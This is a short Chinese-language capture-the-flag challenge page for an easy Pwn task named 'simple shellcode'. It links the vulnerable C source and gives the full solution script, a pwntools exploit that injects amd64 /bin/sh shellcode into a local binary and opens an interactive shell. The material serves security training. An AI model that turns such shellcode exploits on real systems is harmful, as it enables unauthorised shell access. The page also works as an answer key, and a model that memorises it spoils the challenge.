# 简单的shellcode

- 作者：pn1fg

- 参考：-

- 难度：Easy

- 分类：Pwn

- 暴露端口：70

# 题目描述

-

# 题目解析

- 源码：[shellcode.c](build/shellcode.c)

- 考点：写shellcode

[exp.py](writeup/exp.py):

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

io = process('./shellcode')

shellcode = asm(shellcraft.sh()) 

payload = flat(
        [
            shellcode,
        ]
)

io.sendlineafter(b'!\n',payload)

io.interactive()
```
